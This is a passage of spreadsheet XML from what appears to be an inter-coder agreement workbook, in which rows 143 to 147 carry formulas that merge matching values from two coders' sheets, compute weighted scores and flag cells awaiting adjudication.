        <f>IF(AND(Coder1!M143&amp;""&lt;&gt;"",Coder1!M143&amp;""=Coder2!M143&amp;""),Coder1!M143,"")</f>
        <v/>
      </c>
      <c r="N143" s="14">
        <f>IF(AND(Coder1!N143&amp;""&lt;&gt;"",Coder1!N143&amp;""=Coder2!N143&amp;""),Coder1!N143,"")</f>
        <v/>
      </c>
      <c r="O143" s="14">
        <f>IF(AND(Coder1!O143&amp;""&lt;&gt;"",Coder1!O143&amp;""=Coder2!O143&amp;""),Coder1!O143,"")</f>
        <v/>
      </c>
      <c r="P143" s="14">
        <f>IF(AND(Coder1!P143&amp;""&lt;&gt;"",Coder1!P143&amp;""=Coder2!P143&amp;""),Coder1!P143,"")</f>
        <v/>
      </c>
      <c r="Q143" s="14">
        <f>IF(AND(Coder1!Q143&amp;""&lt;&gt;"",Coder1!Q143&amp;""=Coder2!Q143&amp;""),Coder1!Q143,"")</f>
        <v/>
      </c>
      <c r="R143" s="14">
        <f>IF(AND(Coder1!R143&amp;""&lt;&gt;"",Coder1!R143&amp;""=Coder2!R143&amp;""),Coder1!R143,"")</f>
        <v/>
      </c>
      <c r="S143" s="14">
        <f>IF(AND(Coder1!S143&amp;""&lt;&gt;"",Coder1!S143&amp;""=Coder2!S143&amp;""),Coder1!S143,"")</f>
        <v/>
      </c>
      <c r="T143" s="14">
        <f>IF(AND(Coder1!T143&amp;""&lt;&gt;"",Coder1!T143&amp;""=Coder2!T143&amp;""),Coder1!T143,"")</f>
        <v/>
      </c>
      <c r="U143" s="14">
        <f>IF(AND(Coder1!U143&amp;""&lt;&gt;"",Coder1!U143&amp;""=Coder2!U143&amp;""),Coder1!U143,"")</f>
        <v/>
      </c>
      <c r="V143" s="14">
        <f>IF(AND(Coder1!V143&amp;""&lt;&gt;"",Coder1!V143&amp;""=Coder2!V143&amp;""),Coder1!V143,"")</f>
        <v/>
      </c>
      <c r="W143" s="14">
        <f>IF(AND(Coder1!W143&amp;""&lt;&gt;"",Coder1!W143&amp;""=Coder2!W143&amp;""),Coder1!W143,"")</f>
        <v/>
      </c>
      <c r="X143" s="14">
        <f>IF(AND(Coder1!X143&amp;""&lt;&gt;"",Coder1!X143&amp;""=Coder2!X143&amp;""),Coder1!X143,"")</f>
        <v/>
      </c>
      <c r="Y143" s="14">
        <f>IF(AND(Coder1!Y143&amp;""&lt;&gt;"",Coder1!Y143&amp;""=Coder2!Y143&amp;""),Coder1!Y143,"")</f>
        <v/>
      </c>
      <c r="Z143" s="14">
        <f>IF(AND(Coder1!Z143&amp;""&lt;&gt;"",Coder1!Z143&amp;""=Coder2!Z143&amp;""),Coder1!Z143,"")</f>
        <v/>
      </c>
      <c r="AA143" s="14">
        <f>IF(AND(Coder1!AA143&amp;""&lt;&gt;"",Coder1!AA143&amp;""=Coder2!AA143&amp;""),Coder1!AA143,"")</f>
        <v/>
      </c>
      <c r="AB143" s="14">
        <f>IF(AND(Coder1!AB143&amp;""&lt;&gt;"",Coder1!AB143&amp;""=Coder2!AB143&amp;""),Coder1!AB143,"")</f>
        <v/>
      </c>
      <c r="AC143" s="14">
        <f>IF(AND(Coder1!AC143&amp;""&lt;&gt;"",Coder1!AC143&amp;""=Coder2!AC143&amp;""),Coder1!AC143,"")</f>
        <v/>
      </c>
      <c r="AD143" s="14">
        <f>IF(AND(Coder1!AD143&amp;""&lt;&gt;"",Coder1!AD143&amp;""=Coder2!AD143&amp;""),Coder1!AD143,"")</f>
        <v/>
      </c>
      <c r="AE143" s="14">
        <f>IF(AND(Coder1!AE143&amp;""&lt;&gt;"",Coder1!AE143&amp;""=Coder2!AE143&amp;""),Coder1!AE143,"")</f>
        <v/>
      </c>
      <c r="AF143" s="14">
        <f>IF(AND(Coder1!AF143&amp;""&lt;&gt;"",Coder1!AF143&amp;""=Coder2!AF143&amp;""),Coder1!AF143,"")</f>
        <v/>
      </c>
      <c r="AG143" s="14">
        <f>IF(AND(Coder1!AG143&amp;""&lt;&gt;"",Coder1!AG143&amp;""=Coder2!AG143&amp;""),Coder1!AG143,"")</f>
        <v/>
      </c>
      <c r="AH143" s="14">
        <f>IF(AND(Coder1!AH143&amp;""&lt;&gt;"",Coder1!AH143&amp;""=Coder2!AH143&amp;""),Coder1!AH143,"")</f>
        <v/>
      </c>
      <c r="AI143" s="11">
        <f>IF(COUNT(E143:L143)=0,"",SUM(E143:L143))</f>
        <v/>
      </c>
      <c r="AJ143" s="11">
        <f>IF(AI143="","",N(E143)*3+N(F143)*2+N(G143)*2+N(H143)*2+N(I143)*2+N(J143)*3+N(K143)*3+N(L143)*3)</f>
        <v/>
      </c>
      <c r="AK143" s="11">
        <f>IF(AI143="","",COUNTIF(N143:AG143,1))</f>
        <v/>
      </c>
      <c r="AL143" s="11">
        <f>IF(OR(AJ143="",AJ143=0),"",ROUND(100*(AJ143-AK143)/AJ143,1))</f>
        <v/>
      </c>
      <c r="AM143" s="11">
        <f>IF(AND(Coder1!AN143=1,Coder2!AN143=1),IF(COUNTBLANK(E143:AH143)&gt;0,"Adjudicate blank cells",""),"Waiting for both coders")</f>
        <v/>
      </c>
      <c r="AN143" s="11">
        <f>IF(AND(Coder1!AN143=1,Coder2!AN143=1),IF(SUMPRODUCT(--(Coder1!E143:AH143&amp;""&lt;&gt;Coder2!E143:AH143&amp;""))=0,1,0),"")</f>
        <v/>
      </c>
      <c r="AO143" s="11" t="n"/>
    </row>
    <row r="144">
      <c r="A144" s="11">
        <f>Coder1!A144</f>
        <v/>
      </c>
      <c r="B144" s="11">
        <f>Coder1!B144</f>
        <v/>
      </c>
      <c r="C144" s="11">
        <f>Coder1!C144</f>
        <v/>
      </c>
      <c r="D144" s="11">
        <f>Coder1!D144</f>
        <v/>
      </c>
      <c r="E144" s="14">
        <f>IF(AND(Coder1!E144&amp;""&lt;&gt;"",Coder1!E144&amp;""=Coder2!E144&amp;""),Coder1!E144,"")</f>
        <v/>
      </c>
      <c r="F144" s="14">
        <f>IF(AND(Coder1!F144&amp;""&lt;&gt;"",Coder1!F144&amp;""=Coder2!F144&amp;""),Coder1!F144,"")</f>
        <v/>
      </c>
      <c r="G144" s="14">
        <f>IF(AND(Coder1!G144&amp;""&lt;&gt;"",Coder1!G144&amp;""=Coder2!G144&amp;""),Coder1!G144,"")</f>
        <v/>
      </c>
      <c r="H144" s="14">
        <f>IF(AND(Coder1!H144&amp;""&lt;&gt;"",Coder1!H144&amp;""=Coder2!H144&amp;""),Coder1!H144,"")</f>
        <v/>
      </c>
      <c r="I144" s="14">
        <f>IF(AND(Coder1!I144&amp;""&lt;&gt;"",Coder1!I144&amp;""=Coder2!I144&amp;""),Coder1!I144,"")</f>
        <v/>
      </c>
      <c r="J144" s="14">
        <f>IF(AND(Coder1!J144&amp;""&lt;&gt;"",Coder1!J144&amp;""=Coder2!J144&amp;""),Coder1!J144,"")</f>
        <v/>
      </c>
      <c r="K144" s="14">
        <f>IF(AND(Coder1!K144&amp;""&lt;&gt;"",Coder1!K144&amp;""=Coder2!K144&amp;""),Coder1!K144,"")</f>
        <v/>
      </c>
      <c r="L144" s="14">
        <f>IF(AND(Coder1!L144&amp;""&lt;&gt;"",Coder1!L144&amp;""=Coder2!L144&amp;""),Coder1!L144,"")</f>
        <v/>
      </c>
      <c r="M144" s="14">
        <f>IF(AND(Coder1!M144&amp;""&lt;&gt;"",Coder1!M144&amp;""=Coder2!M144&amp;""),Coder1!M144,"")</f>
        <v/>
      </c>
      <c r="N144" s="14">
        <f>IF(AND(Coder1!N144&amp;""&lt;&gt;"",Coder1!N144&amp;""=Coder2!N144&amp;""),Coder1!N144,"")</f>
        <v/>
      </c>
      <c r="O144" s="14">
        <f>IF(AND(Coder1!O144&amp;""&lt;&gt;"",Coder1!O144&amp;""=Coder2!O144&amp;""),Coder1!O144,"")</f>
        <v/>
      </c>
      <c r="P144" s="14">
        <f>IF(AND(Coder1!P144&amp;""&lt;&gt;"",Coder1!P144&amp;""=Coder2!P144&amp;""),Coder1!P144,"")</f>
        <v/>
      </c>
      <c r="Q144" s="14">
        <f>IF(AND(Coder1!Q144&amp;""&lt;&gt;"",Coder1!Q144&amp;""=Coder2!Q144&amp;""),Coder1!Q144,"")</f>
        <v/>
      </c>
      <c r="R144" s="14">
        <f>IF(AND(Coder1!R144&amp;""&lt;&gt;"",Coder1!R144&amp;""=Coder2!R144&amp;""),Coder1!R144,"")</f>
        <v/>
      </c>
      <c r="S144" s="14">
        <f>IF(AND(Coder1!S144&amp;""&lt;&gt;"",Coder1!S144&amp;""=Coder2!S144&amp;""),Coder1!S144,"")</f>
        <v/>
      </c>
      <c r="T144" s="14">
        <f>IF(AND(Coder1!T144&amp;""&lt;&gt;"",Coder1!T144&amp;""=Coder2!T144&amp;""),Coder1!T144,"")</f>
        <v/>
      </c>
      <c r="U144" s="14">
        <f>IF(AND(Coder1!U144&amp;""&lt;&gt;"",Coder1!U144&amp;""=Coder2!U144&amp;""),Coder1!U144,"")</f>
        <v/>
      </c>
      <c r="V144" s="14">
        <f>IF(AND(Coder1!V144&amp;""&lt;&gt;"",Coder1!V144&amp;""=Coder2!V144&amp;""),Coder1!V144,"")</f>
        <v/>
      </c>
      <c r="W144" s="14">
        <f>IF(AND(Coder1!W144&amp;""&lt;&gt;"",Coder1!W144&amp;""=Coder2!W144&amp;""),Coder1!W144,"")</f>
        <v/>
      </c>
      <c r="X144" s="14">
        <f>IF(AND(Coder1!X144&amp;""&lt;&gt;"",Coder1!X144&amp;""=Coder2!X144&amp;""),Coder1!X144,"")</f>
        <v/>
      </c>
      <c r="Y144" s="14">
        <f>IF(AND(Coder1!Y144&amp;""&lt;&gt;"",Coder1!Y144&amp;""=Coder2!Y144&amp;""),Coder1!Y144,"")</f>
        <v/>
      </c>
      <c r="Z144" s="14">
        <f>IF(AND(Coder1!Z144&amp;""&lt;&gt;"",Coder1!Z144&amp;""=Coder2!Z144&amp;""),Coder1!Z144,"")</f>
        <v/>
      </c>
      <c r="AA144" s="14">
        <f>IF(AND(Coder1!AA144&amp;""&lt;&gt;"",Coder1!AA144&amp;""=Coder2!AA144&amp;""),Coder1!AA144,"")</f>
        <v/>
      </c>
      <c r="AB144" s="14">
        <f>IF(AND(Coder1!AB144&amp;""&lt;&gt;"",Coder1!AB144&amp;""=Coder2!AB144&amp;""),Coder1!AB144,"")</f>
        <v/>
      </c>
      <c r="AC144" s="14">
        <f>IF(AND(Coder1!AC144&amp;""&lt;&gt;"",Coder1!AC144&amp;""=Coder2!AC144&amp;""),Coder1!AC144,"")</f>
        <v/>
      </c>
      <c r="AD144" s="14">
        <f>IF(AND(Coder1!AD144&amp;""&lt;&gt;"",Coder1!AD144&amp;""=Coder2!AD144&amp;""),Coder1!AD144,"")</f>
        <v/>
      </c>
      <c r="AE144" s="14">
        <f>IF(AND(Coder1!AE144&amp;""&lt;&gt;"",Coder1!AE144&amp;""=Coder2!AE144&amp;""),Coder1!AE144,"")</f>
        <v/>
      </c>
      <c r="AF144" s="14">
        <f>IF(AND(Coder1!AF144&amp;""&lt;&gt;"",Coder1!AF144&amp;""=Coder2!AF144&amp;""),Coder1!AF144,"")</f>
        <v/>
      </c>
      <c r="AG144" s="14">
        <f>IF(AND(Coder1!AG144&amp;""&lt;&gt;"",Coder1!AG144&amp;""=Coder2!AG144&amp;""),Coder1!AG144,"")</f>
        <v/>
      </c>
      <c r="AH144" s="14">
        <f>IF(AND(Coder1!AH144&amp;""&lt;&gt;"",Coder1!AH144&amp;""=Coder2!AH144&amp;""),Coder1!AH144,"")</f>
        <v/>
      </c>
      <c r="AI144" s="11">
        <f>IF(COUNT(E144:L144)=0,"",SUM(E144:L144))</f>
        <v/>
      </c>
      <c r="AJ144" s="11">
        <f>IF(AI144="","",N(E144)*3+N(F144)*2+N(G144)*2+N(H144)*2+N(I144)*2+N(J144)*3+N(K144)*3+N(L144)*3)</f>
        <v/>
      </c>
      <c r="AK144" s="11">
        <f>IF(AI144="","",COUNTIF(N144:AG144,1))</f>
        <v/>
      </c>
      <c r="AL144" s="11">
        <f>IF(OR(AJ144="",AJ144=0),"",ROUND(100*(AJ144-AK144)/AJ144,1))</f>
        <v/>
      </c>
      <c r="AM144" s="11">
        <f>IF(AND(Coder1!AN144=1,Coder2!AN144=1),IF(COUNTBLANK(E144:AH144)&gt;0,"Adjudicate blank cells",""),"Waiting for both coders")</f>
        <v/>
      </c>
      <c r="AN144" s="11">
        <f>IF(AND(Coder1!AN144=1,Coder2!AN144=1),IF(SUMPRODUCT(--(Coder1!E144:AH144&amp;""&lt;&gt;Coder2!E144:AH144&amp;""))=0,1,0),"")</f>
        <v/>
      </c>
      <c r="AO144" s="11" t="n"/>
    </row>
    <row r="145">
      <c r="A145" s="11">
        <f>Coder1!A145</f>
        <v/>
      </c>
      <c r="B145" s="11">
        <f>Coder1!B145</f>
        <v/>
      </c>
      <c r="C145" s="11">
        <f>Coder1!C145</f>
        <v/>
      </c>
      <c r="D145" s="11">
        <f>Coder1!D145</f>
        <v/>
      </c>
      <c r="E145" s="14">
        <f>IF(AND(Coder1!E145&amp;""&lt;&gt;"",Coder1!E145&amp;""=Coder2!E145&amp;""),Coder1!E145,"")</f>
        <v/>
      </c>
      <c r="F145" s="14">
        <f>IF(AND(Coder1!F145&amp;""&lt;&gt;"",Coder1!F145&amp;""=Coder2!F145&amp;""),Coder1!F145,"")</f>
        <v/>
      </c>
      <c r="G145" s="14">
        <f>IF(AND(Coder1!G145&amp;""&lt;&gt;"",Coder1!G145&amp;""=Coder2!G145&amp;""),Coder1!G145,"")</f>
        <v/>
      </c>
      <c r="H145" s="14">
        <f>IF(AND(Coder1!H145&amp;""&lt;&gt;"",Coder1!H145&amp;""=Coder2!H145&amp;""),Coder1!H145,"")</f>
        <v/>
      </c>
      <c r="I145" s="14">
        <f>IF(AND(Coder1!I145&amp;""&lt;&gt;"",Coder1!I145&amp;""=Coder2!I145&amp;""),Coder1!I145,"")</f>
        <v/>
      </c>
      <c r="J145" s="14">
        <f>IF(AND(Coder1!J145&amp;""&lt;&gt;"",Coder1!J145&amp;""=Coder2!J145&amp;""),Coder1!J145,"")</f>
        <v/>
      </c>
      <c r="K145" s="14">
        <f>IF(AND(Coder1!K145&amp;""&lt;&gt;"",Coder1!K145&amp;""=Coder2!K145&amp;""),Coder1!K145,"")</f>
        <v/>
      </c>
      <c r="L145" s="14">
        <f>IF(AND(Coder1!L145&amp;""&lt;&gt;"",Coder1!L145&amp;""=Coder2!L145&amp;""),Coder1!L145,"")</f>
        <v/>
      </c>
      <c r="M145" s="14">
        <f>IF(AND(Coder1!M145&amp;""&lt;&gt;"",Coder1!M145&amp;""=Coder2!M145&amp;""),Coder1!M145,"")</f>
        <v/>
      </c>
      <c r="N145" s="14">
        <f>IF(AND(Coder1!N145&amp;""&lt;&gt;"",Coder1!N145&amp;""=Coder2!N145&amp;""),Coder1!N145,"")</f>
        <v/>
      </c>
      <c r="O145" s="14">
        <f>IF(AND(Coder1!O145&amp;""&lt;&gt;"",Coder1!O145&amp;""=Coder2!O145&amp;""),Coder1!O145,"")</f>
        <v/>
      </c>
      <c r="P145" s="14">
        <f>IF(AND(Coder1!P145&amp;""&lt;&gt;"",Coder1!P145&amp;""=Coder2!P145&amp;""),Coder1!P145,"")</f>
        <v/>
      </c>
      <c r="Q145" s="14">
        <f>IF(AND(Coder1!Q145&amp;""&lt;&gt;"",Coder1!Q145&amp;""=Coder2!Q145&amp;""),Coder1!Q145,"")</f>
        <v/>
      </c>
      <c r="R145" s="14">
        <f>IF(AND(Coder1!R145&amp;""&lt;&gt;"",Coder1!R145&amp;""=Coder2!R145&amp;""),Coder1!R145,"")</f>
        <v/>
      </c>
      <c r="S145" s="14">
        <f>IF(AND(Coder1!S145&amp;""&lt;&gt;"",Coder1!S145&amp;""=Coder2!S145&amp;""),Coder1!S145,"")</f>
        <v/>
      </c>
      <c r="T145" s="14">
        <f>IF(AND(Coder1!T145&amp;""&lt;&gt;"",Coder1!T145&amp;""=Coder2!T145&amp;""),Coder1!T145,"")</f>
        <v/>
      </c>
      <c r="U145" s="14">
        <f>IF(AND(Coder1!U145&amp;""&lt;&gt;"",Coder1!U145&amp;""=Coder2!U145&amp;""),Coder1!U145,"")</f>
        <v/>
      </c>
      <c r="V145" s="14">
        <f>IF(AND(Coder1!V145&amp;""&lt;&gt;"",Coder1!V145&amp;""=Coder2!V145&amp;""),Coder1!V145,"")</f>
        <v/>
      </c>
      <c r="W145" s="14">
        <f>IF(AND(Coder1!W145&amp;""&lt;&gt;"",Coder1!W145&amp;""=Coder2!W145&amp;""),Coder1!W145,"")</f>
        <v/>
      </c>
      <c r="X145" s="14">
        <f>IF(AND(Coder1!X145&amp;""&lt;&gt;"",Coder1!X145&amp;""=Coder2!X145&amp;""),Coder1!X145,"")</f>
        <v/>
      </c>
      <c r="Y145" s="14">
        <f>IF(AND(Coder1!Y145&amp;""&lt;&gt;"",Coder1!Y145&amp;""=Coder2!Y145&amp;""),Coder1!Y145,"")</f>
        <v/>
      </c>
      <c r="Z145" s="14">
        <f>IF(AND(Coder1!Z145&amp;""&lt;&gt;"",Coder1!Z145&amp;""=Coder2!Z145&amp;""),Coder1!Z145,"")</f>
        <v/>
      </c>
      <c r="AA145" s="14">
        <f>IF(AND(Coder1!AA145&amp;""&lt;&gt;"",Coder1!AA145&amp;""=Coder2!AA145&amp;""),Coder1!AA145,"")</f>
        <v/>
      </c>
      <c r="AB145" s="14">
        <f>IF(AND(Coder1!AB145&amp;""&lt;&gt;"",Coder1!AB145&amp;""=Coder2!AB145&amp;""),Coder1!AB145,"")</f>
        <v/>
      </c>
      <c r="AC145" s="14">
        <f>IF(AND(Coder1!AC145&amp;""&lt;&gt;"",Coder1!AC145&amp;""=Coder2!AC145&amp;""),Coder1!AC145,"")</f>
        <v/>
      </c>
      <c r="AD145" s="14">
        <f>IF(AND(Coder1!AD145&amp;""&lt;&gt;"",Coder1!AD145&amp;""=Coder2!AD145&amp;""),Coder1!AD145,"")</f>
        <v/>
      </c>
      <c r="AE145" s="14">
        <f>IF(AND(Coder1!AE145&amp;""&lt;&gt;"",Coder1!AE145&amp;""=Coder2!AE145&amp;""),Coder1!AE145,"")</f>
        <v/>
      </c>
      <c r="AF145" s="14">
        <f>IF(AND(Coder1!AF145&amp;""&lt;&gt;"",Coder1!AF145&amp;""=Coder2!AF145&amp;""),Coder1!AF145,"")</f>
        <v/>
      </c>
      <c r="AG145" s="14">
        <f>IF(AND(Coder1!AG145&amp;""&lt;&gt;"",Coder1!AG145&amp;""=Coder2!AG145&amp;""),Coder1!AG145,"")</f>
        <v/>
      </c>
      <c r="AH145" s="14">
        <f>IF(AND(Coder1!AH145&amp;""&lt;&gt;"",Coder1!AH145&amp;""=Coder2!AH145&amp;""),Coder1!AH145,"")</f>
        <v/>
      </c>
      <c r="AI145" s="11">
        <f>IF(COUNT(E145:L145)=0,"",SUM(E145:L145))</f>
        <v/>
      </c>
      <c r="AJ145" s="11">
        <f>IF(AI145="","",N(E145)*3+N(F145)*2+N(G145)*2+N(H145)*2+N(I145)*2+N(J145)*3+N(K145)*3+N(L145)*3)</f>
        <v/>
      </c>
      <c r="AK145" s="11">
        <f>IF(AI145="","",COUNTIF(N145:AG145,1))</f>
        <v/>
      </c>
      <c r="AL145" s="11">
        <f>IF(OR(AJ145="",AJ145=0),"",ROUND(100*(AJ145-AK145)/AJ145,1))</f>
        <v/>
      </c>
      <c r="AM145" s="11">
        <f>IF(AND(Coder1!AN145=1,Coder2!AN145=1),IF(COUNTBLANK(E145:AH145)&gt;0,"Adjudicate blank cells",""),"Waiting for both coders")</f>
        <v/>
      </c>
      <c r="AN145" s="11">
        <f>IF(AND(Coder1!AN145=1,Coder2!AN145=1),IF(SUMPRODUCT(--(Coder1!E145:AH145&amp;""&lt;&gt;Coder2!E145:AH145&amp;""))=0,1,0),"")</f>
        <v/>
      </c>
      <c r="AO145" s="11" t="n"/>
    </row>
    <row r="146">
      <c r="A146" s="11">
        <f>Coder1!A146</f>
        <v/>
      </c>
      <c r="B146" s="11">
        <f>Coder1!B146</f>
        <v/>
      </c>
      <c r="C146" s="11">
        <f>Coder1!C146</f>
        <v/>
      </c>
      <c r="D146" s="11">
        <f>Coder1!D146</f>
        <v/>
      </c>
      <c r="E146" s="14">
        <f>IF(AND(Coder1!E146&amp;""&lt;&gt;"",Coder1!E146&amp;""=Coder2!E146&amp;""),Coder1!E146,"")</f>
        <v/>
      </c>
      <c r="F146" s="14">
        <f>IF(AND(Coder1!F146&amp;""&lt;&gt;"",Coder1!F146&amp;""=Coder2!F146&amp;""),Coder1!F146,"")</f>
        <v/>
      </c>
      <c r="G146" s="14">
        <f>IF(AND(Coder1!G146&amp;""&lt;&gt;"",Coder1!G146&amp;""=Coder2!G146&amp;""),Coder1!G146,"")</f>
        <v/>
      </c>
      <c r="H146" s="14">
        <f>IF(AND(Coder1!H146&amp;""&lt;&gt;"",Coder1!H146&amp;""=Coder2!H146&amp;""),Coder1!H146,"")</f>
        <v/>
      </c>
      <c r="I146" s="14">
        <f>IF(AND(Coder1!I146&amp;""&lt;&gt;"",Coder1!I146&amp;""=Coder2!I146&amp;""),Coder1!I146,"")</f>
        <v/>
      </c>
      <c r="J146" s="14">
        <f>IF(AND(Coder1!J146&amp;""&lt;&gt;"",Coder1!J146&amp;""=Coder2!J146&amp;""),Coder1!J146,"")</f>
        <v/>
      </c>
      <c r="K146" s="14">
        <f>IF(AND(Coder1!K146&amp;""&lt;&gt;"",Coder1!K146&amp;""=Coder2!K146&amp;""),Coder1!K146,"")</f>
        <v/>
      </c>
      <c r="L146" s="14">
        <f>IF(AND(Coder1!L146&amp;""&lt;&gt;"",Coder1!L146&amp;""=Coder2!L146&amp;""),Coder1!L146,"")</f>
        <v/>
      </c>
      <c r="M146" s="14">
        <f>IF(AND(Coder1!M146&amp;""&lt;&gt;"",Coder1!M146&amp;""=Coder2!M146&amp;""),Coder1!M146,"")</f>
        <v/>
      </c>
      <c r="N146" s="14">
        <f>IF(AND(Coder1!N146&amp;""&lt;&gt;"",Coder1!N146&amp;""=Coder2!N146&amp;""),Coder1!N146,"")</f>
        <v/>
      </c>
      <c r="O146" s="14">
        <f>IF(AND(Coder1!O146&amp;""&lt;&gt;"",Coder1!O146&amp;""=Coder2!O146&amp;""),Coder1!O146,"")</f>
        <v/>
      </c>
      <c r="P146" s="14">
        <f>IF(AND(Coder1!P146&amp;""&lt;&gt;"",Coder1!P146&amp;""=Coder2!P146&amp;""),Coder1!P146,"")</f>
        <v/>
      </c>
      <c r="Q146" s="14">
        <f>IF(AND(Coder1!Q146&amp;""&lt;&gt;"",Coder1!Q146&amp;""=Coder2!Q146&amp;""),Coder1!Q146,"")</f>
        <v/>
      </c>
      <c r="R146" s="14">
        <f>IF(AND(Coder1!R146&amp;""&lt;&gt;"",Coder1!R146&amp;""=Coder2!R146&amp;""),Coder1!R146,"")</f>
        <v/>
      </c>
      <c r="S146" s="14">
        <f>IF(AND(Coder1!S146&amp;""&lt;&gt;"",Coder1!S146&amp;""=Coder2!S146&amp;""),Coder1!S146,"")</f>
        <v/>
      </c>
      <c r="T146" s="14">
        <f>IF(AND(Coder1!T146&amp;""&lt;&gt;"",Coder1!T146&amp;""=Coder2!T146&amp;""),Coder1!T146,"")</f>
        <v/>
      </c>
      <c r="U146" s="14">
        <f>IF(AND(Coder1!U146&amp;""&lt;&gt;"",Coder1!U146&amp;""=Coder2!U146&amp;""),Coder1!U146,"")</f>
        <v/>
      </c>
      <c r="V146" s="14">
        <f>IF(AND(Coder1!V146&amp;""&lt;&gt;"",Coder1!V146&amp;""=Coder2!V146&amp;""),Coder1!V146,"")</f>
        <v/>
      </c>
      <c r="W146" s="14">
        <f>IF(AND(Coder1!W146&amp;""&lt;&gt;"",Coder1!W146&amp;""=Coder2!W146&amp;""),Coder1!W146,"")</f>
        <v/>
      </c>
      <c r="X146" s="14">
        <f>IF(AND(Coder1!X146&amp;""&lt;&gt;"",Coder1!X146&amp;""=Coder2!X146&amp;""),Coder1!X146,"")</f>
        <v/>
      </c>
      <c r="Y146" s="14">
        <f>IF(AND(Coder1!Y146&amp;""&lt;&gt;"",Coder1!Y146&amp;""=Coder2!Y146&amp;""),Coder1!Y146,"")</f>
        <v/>
      </c>
      <c r="Z146" s="14">
        <f>IF(AND(Coder1!Z146&amp;""&lt;&gt;"",Coder1!Z146&amp;""=Coder2!Z146&amp;""),Coder1!Z146,"")</f>
        <v/>
      </c>
      <c r="AA146" s="14">
        <f>IF(AND(Coder1!AA146&amp;""&lt;&gt;"",Coder1!AA146&amp;""=Coder2!AA146&amp;""),Coder1!AA146,"")</f>
        <v/>
      </c>
      <c r="AB146" s="14">
        <f>IF(AND(Coder1!AB146&amp;""&lt;&gt;"",Coder1!AB146&amp;""=Coder2!AB146&amp;""),Coder1!AB146,"")</f>
        <v/>
      </c>
      <c r="AC146" s="14">
        <f>IF(AND(Coder1!AC146&amp;""&lt;&gt;"",Coder1!AC146&amp;""=Coder2!AC146&amp;""),Coder1!AC146,"")</f>
        <v/>
      </c>
      <c r="AD146" s="14">
        <f>IF(AND(Coder1!AD146&amp;""&lt;&gt;"",Coder1!AD146&amp;""=Coder2!AD146&amp;""),Coder1!AD146,"")</f>
        <v/>
      </c>
      <c r="AE146" s="14">
        <f>IF(AND(Coder1!AE146&amp;""&lt;&gt;"",Coder1!AE146&amp;""=Coder2!AE146&amp;""),Coder1!AE146,"")</f>
        <v/>
      </c>
      <c r="AF146" s="14">
        <f>IF(AND(Coder1!AF146&amp;""&lt;&gt;"",Coder1!AF146&amp;""=Coder2!AF146&amp;""),Coder1!AF146,"")</f>
        <v/>
      </c>
      <c r="AG146" s="14">
        <f>IF(AND(Coder1!AG146&amp;""&lt;&gt;"",Coder1!AG146&amp;""=Coder2!AG146&amp;""),Coder1!AG146,"")</f>
        <v/>
      </c>
      <c r="AH146" s="14">
        <f>IF(AND(Coder1!AH146&amp;""&lt;&gt;"",Coder1!AH146&amp;""=Coder2!AH146&amp;""),Coder1!AH146,"")</f>
        <v/>
      </c>
      <c r="AI146" s="11">
        <f>IF(COUNT(E146:L146)=0,"",SUM(E146:L146))</f>
        <v/>
      </c>
      <c r="AJ146" s="11">
        <f>IF(AI146="","",N(E146)*3+N(F146)*2+N(G146)*2+N(H146)*2+N(I146)*2+N(J146)*3+N(K146)*3+N(L146)*3)</f>
        <v/>
      </c>
      <c r="AK146" s="11">
        <f>IF(AI146="","",COUNTIF(N146:AG146,1))</f>
        <v/>
      </c>
      <c r="AL146" s="11">
        <f>IF(OR(AJ146="",AJ146=0),"",ROUND(100*(AJ146-AK146)/AJ146,1))</f>
        <v/>
      </c>
      <c r="AM146" s="11">
        <f>IF(AND(Coder1!AN146=1,Coder2!AN146=1),IF(COUNTBLANK(E146:AH146)&gt;0,"Adjudicate blank cells",""),"Waiting for both coders")</f>
        <v/>
      </c>
      <c r="AN146" s="11">
        <f>IF(AND(Coder1!AN146=1,Coder2!AN146=1),IF(SUMPRODUCT(--(Coder1!E146:AH146&amp;""&lt;&gt;Coder2!E146:AH146&amp;""))=0,1,0),"")</f>
        <v/>
      </c>
      <c r="AO146" s="11" t="n"/>
    </row>
    <row r="147">
      <c r="A147" s="11">
        <f>Coder1!A147</f>
        <v/>
      </c>
      <c r="B147" s="11">
        <f>Coder1!B147</f>
        <v/>
      </c>
      <c r="C147" s="11">
        <f>Coder1!C147</f>
        <v/>
      </c>
      <c r="D147" s="11">
        <f>Coder1!D147</f>
        <v/>
      </c>
      <c r="E147" s="14">
        <f>IF(AND(Coder1!E147&amp;""&lt;&gt;"",Coder1!E147&amp;""=Coder2!E147&amp;""),Coder1!E147,"")</f>
        <v/>
      </c>
      <c r="F147" s="14">
        <f>IF(AND(Coder1!F147&amp;""&lt;&gt;"",Coder1!F147&amp;""=Coder2!F147&amp;""),Coder1!F147,"")</f>
        <v/>
      </c>
      <c r="G147" s="14">
        <f>IF(AND(Coder1!G147&amp;""&lt;&gt;"",Coder1!G147&amp;""=Coder2!G147&amp;""),Coder1!G147,"")</f>
        <v/>
      </c>
      <c r="H147" s="14">
        <f>IF(AND(Coder1!H147&amp;""&lt;&gt;"",Coder1!H147&amp;""=Coder2!H147&amp;""),Coder1!H147,"")</f>
        <v/>
      </c>
      <c r="I147" s="14">
        <f>IF(AND(Coder1!I147&amp;""&lt;&gt;"",Coder1!I147&amp;""=Coder2!I147&amp;""),Coder1!I147,"")</f>
        <v/>
      </c>
      <c r="J147" s="14">
        <f>IF(AND(Coder1!J147&amp;""&lt;&gt;"",Coder1!J147&amp;""=Coder2!J147&amp;""),Coder1!J147,"")</f>
        <v/>
      </c>
      <c r="K147" s="14">
        <f>IF(AND(Coder1!K147&amp;""&lt;&gt;"",Coder1!K147&amp;""=Coder2!K147&amp;""),Coder1!K147,"")</f>
        <v/>
      </c>
      <c r="L147" s="14">
        <f>IF(AND(Coder1!L147&amp;""&lt;&gt;"",Coder1!L147&amp;""=Coder2!L147&amp;""),Coder1!L147,"")</f>
        <v/>
      </c>
      <c r="M147" s="14">
        <f>IF(AND(Coder1!M147&amp;""&lt;&gt;"",Coder1!M147&amp;""=Coder2!M147&amp;""),Coder1!M147,"")</f>
        <v/>
      </c>
      <c r="N147" s="14">
        <f>IF(AND(Coder1!N147&amp;""&lt;&gt;"",Coder1!N147&amp;""=Coder2!N147&amp;""),Coder1!N147,"")</f>
        <v/>
      </c>
      <c r="O147" s="14">
        <f>IF(AND(Coder1!O147&amp;""&lt;&gt;"",Coder1!O147&amp;""=Coder2!O147&amp;""),Coder1!O147,"")</f>
        <v/>
      </c>
      <c r="P147" s="14">
